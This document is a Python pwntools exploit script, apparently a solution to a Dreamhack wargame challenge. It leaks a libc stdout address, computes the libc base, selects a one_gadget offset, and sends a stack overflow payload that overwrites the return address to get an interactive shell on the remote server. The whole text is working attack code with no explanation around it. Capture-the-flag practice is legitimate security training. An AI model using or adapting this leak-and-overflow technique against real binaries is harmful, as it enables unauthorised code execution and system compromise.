from pwn import *

p = remote("host8.dreamhack.games" ,19673)
libc = ELF("./libc.so.6")

p.recvuntil(b"stdout: ")
stdout = int(p.recvline(), 16)

libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
og = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
og = og[0] + libc_base

print(hex(libc_base))

#16(buf) + check(8) + dummy(8) + sfp(8) + ret(8)
payload = b"\x00" * 0x20
payload += b"A" * 8
payload += p64(og)[:8]

p.sendafter(b"MSG: ", payload)
p.recvline()

p.interactive()